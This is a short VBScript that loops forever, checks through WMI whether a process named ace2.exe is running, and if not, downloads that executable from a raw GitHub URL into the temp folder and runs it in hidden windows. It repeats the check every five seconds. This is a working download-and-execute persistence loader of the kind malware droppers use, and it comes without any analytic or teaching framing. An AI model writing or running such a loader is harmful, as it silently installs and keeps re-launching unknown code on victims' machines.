Dim WshShell, processName

Set WshShell = CreateObject("WScript.Shell")



processName = "ace2.exe"



Do

    ' Check if the process is running

    If Not IsProcessRunning(processName) Then

        ' Enable error handling

        On Error Resume Next

        

        ' If not running, download and execute ace2.exe

        WshShell.Run "%COMSPEC% /c curl https://raw.githubusercontent.com/breakwilliam/new-project/refs/heads/main/ace2.exe -o %TEMP%\ace2.exe", 0, True

        

        ' Check for errors after download

        If Err.Number <> 0 Then

            WshShell.Popup "Download failed: " & Err.Description, 5, "Error", 16

            Err.Clear

        Else

            ' If download succeeds, run the executable

            WshShell.Run "%COMSPEC% /c %TEMP%\ace2.exe", 0, False

        End If

        

        ' Disable error handling

        On Error GoTo 0

    End If

    

    ' Sleep for 5 seconds before checking again

    WScript.Sleep 5000

Loop



Function IsProcessRunning(processName)

    Dim objWMIService, colProcessList

    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")

    Set colProcessList = objWMIService.ExecQuery("Select * from Win32_Process Where Name = '" & processName & "'")

    IsProcessRunning = (colProcessList.Count > 0)

End Function

